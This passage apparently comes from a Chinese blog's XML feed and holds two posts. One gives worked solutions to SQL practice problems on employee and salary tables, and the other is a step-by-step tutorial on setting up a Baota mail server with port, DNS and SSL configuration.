class="token punctuation">,</span><span class="token punctuation">`</span>salary<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>from_date<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>to_date<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>emp_no<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>from_date<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> dept_emp <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">,</span><span class="token string">'d001'</span><span class="token punctuation">,</span><span class="token string">'1986-06-26'</span><span class="token punctuation">,</span><span class="token string">'9999-01-01'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> dept_emp <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10002</span><span class="token punctuation">,</span><span class="token string">'d001'</span><span class="token punctuation">,</span><span class="token string">'1996-08-03'</span><span class="token punctuation">,</span><span class="token string">'9999-01-01'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> dept_emp <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10003</span><span class="token punctuation">,</span><span class="token string">'d002'</span><span class="token punctuation">,</span><span class="token string">'1996-08-03'</span><span class="token punctuation">,</span><span class="token string">'9999-01-01'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> salaries <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">,</span><span class="token number">88958</span><span class="token punctuation">,</span><span class="token string">'2002-06-22'</span><span class="token punctuation">,</span><span class="token string">'9999-01-01'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> salaries <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10002</span><span class="token punctuation">,</span><span class="token number">72527</span><span class="token punctuation">,</span><span class="token string">'2001-08-02'</span><span class="token punctuation">,</span><span class="token string">'9999-01-01'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> salaries <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10003</span><span class="token punctuation">,</span><span class="token number">92527</span><span class="token punctuation">,</span><span class="token string">'2001-08-02'</span><span class="token punctuation">,</span><span class="token string">'9999-01-01'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>输出：d001<span class="token operator">|</span><span class="token number">10001</span><span class="token operator">|</span><span class="token number">88958</span>d002<span class="token operator">|</span><span class="token number">10003</span><span class="token operator">|</span><span class="token number">92527</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先进行题目分解，要求是每个部门……所以可以知道是要根据部门进行分组。同时，既要查询部门也要查询部员对应的salaries，所以是要进行多表查询。</p><p><strong>在解题之前，先思考：</strong></p><ol><li>group by 到底是如何进行分组的，能查询的字段有哪些？</li><li>如何确保对应部门的最大薪资对应的员工是正确的？</li><li>如果有两个员工都是一样的最大薪资呢？</li></ol><p><font color="#FF5E3A" size="3">这里有三篇相关博客</font>：</p><p><a href="https://www.cnblogs.com/geogre123/p/11177204.html">GROUP BY语句与HAVING语句的使用</a></p><p><a href="https://blog.51cto.com/u_15239049/3261059"><strong>MySQL数据库之GROUP BY用法</strong></a></p><p><a href="https://www.cnblogs.com/xcyjblog/p/14838443.html">SQL中GROUP BY 默认取非聚合的第一条记录</a></p><p>接下来我们先做个简单的：查询每个部门的最高薪水</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select dept_no,max(salary) from dept_emp d join salaries s on d.emp_no=s.emp_no group by dept_no order by max(salary) desc;+---------+-------------+| dept_no | max(salary) |+---------+-------------+| d002    |       92527 || d001    |       88958 |+---------+-------------+2 rows in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路很简单就是多表查询，并且根据dept_no 进行分组，然后查询dept_no，以及对应分组中的聚合字段max(salary)。</p><p>那如果同时要查询emp_no会增加什么呢？从上面的group by可知，我们不能根据分组结果直接查询emp_no，因为是非聚合字段。从而排除了直接根据分组结果进行查询的方法。</p><p>这是我们可以想到子查询！因为我们从上面那个简单的可以看出我们已经能够查询出两个字段了，完全可以根据这两个字段找到emp_no的信息，同时通过这种 ……in……方法也解决了多个员工的问题：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dept_no<span class="token punctuation">,</span>s<span class="token punctuation">.</span>emp_no<span class="token punctuation">,</span>salary maxSalary<span class="token keyword">from</span> dept_emp de <span class="token keyword">join</span> salaries s <span class="token keyword">on</span> de<span class="token punctuation">.</span>emp_no<span class="token operator">=</span>s<span class="token punctuation">.</span>emp_no <span class="token keyword">where</span> <span class="token punctuation">(</span>dept_no<span class="token punctuation">,</span>salary<span class="token punctuation">)</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">select</span> dept_no<span class="token punctuation">,</span><span class="token function">max</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span>                               <span class="token keyword">from</span> dept_emp de <span class="token keyword">join</span> salaries s                <span class="token keyword">on</span> de<span class="token punctuation">.</span>emp_no<span class="token operator">=</span>s<span class="token punctuation">.</span>emp_no                <span class="token keyword">where</span> s<span class="token punctuation">.</span>to_date<span class="token operator">=</span><span class="token string">'9999-01-01'</span> <span class="token operator">and</span> de<span class="token punctuation">.</span>to_date<span class="token operator">=</span><span class="token string">'9999-01-01'</span>  <span class="token comment">#当前员工！！</span>               <span class="token keyword">group</span> <span class="token keyword">by</span> dept_no<span class="token punctuation">)</span><span class="token keyword">order</span> <span class="token keyword">by</span> dept_no<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如图为查询结果：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/db/202203262324392.png"></p><h3 id="SQL2-查找最晚入职员工的所有信息"><a href="#SQL2-查找最晚入职员工的所有信息" class="headerlink" title="SQL2 查找最晚入职员工的所有信息"></a>SQL2 查找最晚入职员工的所有信息</h3><p>描述</p><p>有一个员工employees表简况如下:</p><table><thead><tr><th>emp_no</th><th>birth_date</th><th>first_name</th><th>last_name</th><th>gender</th><th>hire_date</th></tr></thead><tbody><tr><td>10001</td><td>1953-09-02</td><td>Georgi</td><td>Facello</td><td>M</td><td>1986-06-26</td></tr><tr><td>10002</td><td>1964-06-02</td><td>Bezalel</td><td>Simmel</td><td>F</td><td>1985-11-21</td></tr><tr><td>10003</td><td>1959-12-03</td><td>Parto</td><td>Bamford</td><td>M</td><td>1986-08-28</td></tr><tr><td>10004</td><td>1954-05-01</td><td>Christian</td><td>Koblick</td><td>M</td><td>1986-12-01</td></tr></tbody></table><p>请你查找employees里最晚入职员工的所有信息，以上例子输出如下:</p><table><thead><tr><th>emp_no</th><th>birth_date</th><th>first_name</th><th>last_name</th><th>gender</th><th>hire_date</th></tr></thead><tbody><tr><td>10004</td><td>1954-05-01</td><td>Christian</td><td>Koblick</td><td>M</td><td>1986-12-01</td></tr></tbody></table><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span>  <span class="token punctuation">`</span>employees<span class="token punctuation">`</span> <span class="token punctuation">;</span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>employees<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>emp_no<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>birth_date<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>first_name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>last_name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>gender<span class="token punctuation">`</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>hire_date<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>emp_no<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">,</span><span class="token string">'1953-09-02'</span><span class="token punctuation">,</span><span class="token string">'Georgi'</span><span class="token punctuation">,</span><span class="token string">'Facello'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'1986-06-26'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10002</span><span class="token punctuation">,</span><span class="token string">'1964-06-02'</span><span class="token punctuation">,</span><span class="token string">'Bezalel'</span><span class="token punctuation">,</span><span class="token string">'Simmel'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'1985-11-21'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10003</span><span class="token punctuation">,</span><span class="token string">'1959-12-03'</span><span class="token punctuation">,</span><span class="token string">'Parto'</span><span class="token punctuation">,</span><span class="token string">'Bamford'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'1986-08-28'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10004</span><span class="token punctuation">,</span><span class="token string">'1954-05-01'</span><span class="token punctuation">,</span><span class="token string">'Chirstian'</span><span class="token punctuation">,</span><span class="token string">'Koblick'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'1986-12-01'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10005</span><span class="token punctuation">,</span><span class="token string">'1955-01-21'</span><span class="token punctuation">,</span><span class="token string">'Kyoichi'</span><span class="token punctuation">,</span><span class="token string">'Maliniak'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'1989-09-12'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10006</span><span class="token punctuation">,</span><span class="token string">'1953-04-20'</span><span class="token punctuation">,</span><span class="token string">'Anneke'</span><span class="token punctuation">,</span><span class="token string">'Preusig'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'1989-06-02'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10007</span><span class="token punctuation">,</span><span class="token string">'1957-05-23'</span><span class="token punctuation">,</span><span class="token string">'Tzvetan'</span><span class="token punctuation">,</span><span class="token string">'Zielinski'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'1989-02-10'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10008</span><span class="token punctuation">,</span><span class="token string">'1958-02-19'</span><span class="token punctuation">,</span><span class="token string">'Saniya'</span><span class="token punctuation">,</span><span class="token string">'Kalloufi'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'1994-09-15'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10009</span><span class="token punctuation">,</span><span class="token string">'1952-04-19'</span><span class="token punctuation">,</span><span class="token string">'Sumant'</span><span class="token punctuation">,</span><span class="token string">'Peac'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'1985-02-18'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10010</span><span class="token punctuation">,</span><span class="token string">'1963-06-01'</span><span class="token punctuation">,</span><span class="token string">'Duangkaew'</span><span class="token punctuation">,</span><span class="token string">'Piveteau'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'1989-08-24'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10011</span><span class="token punctuation">,</span><span class="token string">'1953-11-07'</span><span class="token punctuation">,</span><span class="token string">'Mary'</span><span class="token punctuation">,</span><span class="token string">'Sluis'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'1990-01-22'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题相对简单，主要就是有个更优解没想到：主要就是函数的使用！！！</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">method1：<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> employees <span class="token keyword">where</span> hire_date <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> hire_date <span class="token keyword">from</span> employees <span class="token keyword">order</span> <span class="token keyword">by</span> hire_date <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>method2：<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> employees    <span class="token keyword">where</span> hire_date <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">max</span><span class="token punctuation">(</span>hire_date<span class="token punctuation">)</span> <span class="token keyword">from</span> employees<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是如果题目没说最晚只有一个等，记得不一定只有一个记录！</p><h3 id="SQL3-查找employees表emp-no与last-name的员工信息"><a href="#SQL3-查找employees表emp-no与last-name的员工信息" class="headerlink" title="SQL3 查找employees表emp_no与last_name的员工信息"></a>SQL3 查找employees表emp_no与last_name的员工信息</h3><p>有一个员工表employees简况如下:</p><table><thead><tr><th>emp_no</th><th>birth_date</th><th>first_name</th><th>last_name</th><th>gender</th><th>hire_date</th></tr></thead><tbody><tr><td>10001</td><td>1953-09-02</td><td>Georgi</td><td>Facello</td><td>M</td><td>1986-06-26</td></tr><tr><td>10002</td><td>1964-06-02</td><td>Bezalel</td><td>Simmel</td><td>F</td><td>1985-11-21</td></tr><tr><td>10003</td><td>1959-12-03</td><td>Bezalel</td><td>Mary</td><td>M</td><td>1986-08-28</td></tr><tr><td>10004</td><td>1954-05-01</td><td>Christian</td><td>Koblick</td><td>M</td><td>1986-12-01</td></tr><tr><td>10005</td><td>1953-11-07</td><td>Mary</td><td>Sluis</td><td>F</td><td>1990-01-22</td></tr></tbody></table><p>请你查找employees表所有emp_no为<strong>奇数</strong>，且last_name不为Mary的员工信息，并按照hire_date逆序排列，以上例子查询结果如下:</p><table><thead><tr><th>emp_no</th><th>birth_date</th><th>first_name</th><th>last_name</th><th>gender</th><th>hire_date</th></tr></thead><tbody><tr><td>10005</td><td>1953-11-07</td><td>Mary</td><td>Sluis</td><td>F</td><td>1990-01-22</td></tr><tr><td>10001</td><td>1953-09-02</td><td>Georgi</td><td>Facello</td><td>M</td><td>1986-06-26</td></tr></tbody></table><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span>  <span class="token punctuation">`</span>employees<span class="token punctuation">`</span> <span class="token punctuation">;</span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>employees<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>emp_no<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>birth_date<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>first_name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>last_name<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>gender<span class="token punctuation">`</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>hire_date<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>emp_no<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">,</span><span class="token string">'1953-09-02'</span><span class="token punctuation">,</span><span class="token string">'Georgi'</span><span class="token punctuation">,</span><span class="token string">'Facello'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'1986-06-26'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10002</span><span class="token punctuation">,</span><span class="token string">'1964-06-02'</span><span class="token punctuation">,</span><span class="token string">'Bezalel'</span><span class="token punctuation">,</span><span class="token string">'Simmel'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'1985-11-21'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10003</span><span class="token punctuation">,</span><span class="token string">'1959-12-03'</span><span class="token punctuation">,</span><span class="token string">'Bezalel'</span><span class="token punctuation">,</span><span class="token string">'Mary'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'1986-08-28'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10004</span><span class="token punctuation">,</span><span class="token string">'1954-05-01'</span><span class="token punctuation">,</span><span class="token string">'Chirstian'</span><span class="token punctuation">,</span><span class="token string">'Koblick'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'1986-12-01'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> employees <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token number">10005</span><span class="token punctuation">,</span><span class="token string">'1953-11-07'</span><span class="token punctuation">,</span><span class="token string">'Mary'</span><span class="token punctuation">,</span><span class="token string">'Sluis'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'1990-01-22'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> employees <span class="token keyword">where</span> emp_no<span class="token operator">%</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> last_name <span class="token operator">&lt;&gt;</span> <span class="token string">'Mary'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> hire_date <span class="token keyword">desc</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">题目：查找employees表所有emp_no为奇数，且last_name不为Mary的员工信息，并按照hire_date逆序排列题意：每个title下，emp_no重复的员工忽略不计方法1：使用%SELECT *FROM employeesWHERE emp_no % 2 = 1AND last_name&lt;&gt;'Mary'ORDER BY hire_date DESC;补充：emp_no % 2=1也可以改成MOD(emp_no, 2)=1，但是某些sql版本可能不支持后者(比如题库就不支持)补充：不相等有三种表示方式：&lt;&gt;、!=、IS NOT注意：last_name是varchar类型，所以对它的判断需要加上单引号方法2：使用&amp;SELECT *FROM employeesWHERE emp_no &amp; 1AND last_name&lt;&gt;'Mary'ORDER BY hire_date DESC;补充：sql中/表示标准除法，如101/2得到50.5，而DIV表示整数除法，如101 DIV 2得到50补充：奇偶数查询：参考资料：https://blog.csdn.net/ccStroy/article/details/78061861查询奇数的一般方法：如上(最好是位运算&amp;)查询偶数的一般方法：emp_no=(emp_no&gt;&gt;1&lt;&lt;1)但是，以上的一般方法，针对的是字段全是数字的情况，如果对于身份证这种中间隐藏了一部分的，积极无法使用所以更好的方法是使用正则化表达式(当然题库这里无法使用正则化表达式，可能是版本或设置问题)查询奇数的正则化方法：emp_no REGEXP ‘[13579]’注意：表示以13579中的任意一个结尾补充：顺便说一下正则化表达式：^aa：以aa开头aa$：以aa结尾.：匹配任何字符[abc]：[字符集合]，包含中括号内的字符[^abc]或[!abc]：[字符集合]，不包含中括号内的字符a|b|c：匹配a或b或c，如(中|美)国：匹配前面的子表达式0次或者多次。如，zo能匹配’z’以及’zoo’。*等价于{0,}+：匹配前面的子表达式1次或者多次。如，’zo+’能匹配’zo’，但不能匹配’z’。+等价于{1,}{n}：n是一个非负整数，匹配前面的子表达式2次。如，o{2} 能匹配’food’中的两个o，但不能匹配’Bob’中的o{n, m}：m和n均为非负整数，其中n&lt;=m。最少匹配n次且最多匹配m次。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/db/202203262324394.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器搭建邮箱系统</title>
      <link href="/posts/myh10023.html"/>
      <url>/posts/myh10023.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="服务器搭建宝塔邮局系统"><a href="#服务器搭建宝塔邮局系统" class="headerlink" title="服务器搭建宝塔邮局系统"></a>服务器搭建宝塔邮局系统</h2><h3 id="1-开放端口"><a href="#1-开放端口" class="headerlink" title="1.开放端口"></a>1.开放端口</h3><pre class="line-numbers language-none"><code class="language-none">放行端口:[25]Mail-Server放行端口:[587]Mail-Server放行端口:[993]Mail-Server放行端口:[995]Mail-Server放行端口:[465]Mail-Server放行端口:[143]Mail-Server放行端口:[110]Mail-Server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这几个都是邮箱系统常用的端口号。这里记得一定要<font color="red" size="3">在服务器管理页面的防火墙处开放端口</font>，否则可能收不到从qq、gmail等发送的邮件。</p><h3 id="2-安装宝塔邮局系统"><a href="#2-安装宝塔邮局系统" class="headerlink" title="2.安装宝塔邮局系统"></a>2.安装宝塔邮局系统</h3><p>总共需要安装两个软件：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202203111424972.png"></p><h3 id="3-部署邮局系统"><a href="#3-部署邮局系统" class="headerlink" title="3.部署邮局系统"></a>3.部署邮局系统</h3><h4 id="3-1-初始进入页面会输入主机名，输入一级域名即可"><a href="#3-1-初始进入页面会输入主机名，输入一级域名即可" class="headerlink" title="3.1 初始进入页面会输入主机名，输入一级域名即可"></a>3.1 初始进入页面会输入主机名，输入一级域名即可</h4><h4 id="3-2-添加邮箱域名"><a href="#3-2-添加邮箱域名" class="headerlink" title="3.2 添加邮箱域名"></a>3.2 添加邮箱域名</h4><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202203111424974.png"></p><p>可以看到下面有提示：</p><ol><li>邮箱域名只支持一级域名：就是 xxx.com 或 xxx.xyz 等，只能是一级域名</li><li>输入域名A记录，也就是你的子域名形式，类似：yyy.xxx.com等，一般mail.xxx.com就可。</li></ol><h3 id="4-添加对应的域名解析"><a href="#4-添加对应的域名解析" class="headerlink" title="4.添加对应的域名解析"></a>4.添加对应的域名解析</h3><p>进入域名控制台进行相应的解析操作。</p><p>首先添加A记录：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202203111424975.png"></p><p>然后是MX记录：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202203111424976.png"></p><p>还需添加TXT记录，这个按照上面的提示来就好：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202203111424977.png"></p><h3 id="5、创建SSL"><a href="#5、创建SSL" class="headerlink" title="5、创建SSL"></a>5、创建SSL</h3><p>这个按照手动解析步骤一步一步添加域名记录值就好，<font color="red" size="3">申请证书也是必须的，否则可能接收不到消息！</font></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202203111424978.png"></p><h3 id="6、创建用户"><a href="#6、创建用户" class="headerlink" title="6、创建用户"></a>6、创建用户</h3><p>在部署好域名之后如图：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202203111424979.png"></p><p>之后点击用户管理就可以添加用户然后收发邮件了，就有了自己域名的邮箱系统！</p><hr><p>搭建的过程还是比较容易的，重点还是要理解几个域名解析的作用，搞清楚其中的原理，明白A记录等的作用，这样搭建的时候就不会容易错，同时记得开端口！</p><p>还可以搭建独立的邮局系统，使用EwoMail,具体搭建教程可见：<a href="https://ld246.com/article/1572762728304">https://ld246.com/article/1572762728304</a></p><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202203111424980.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
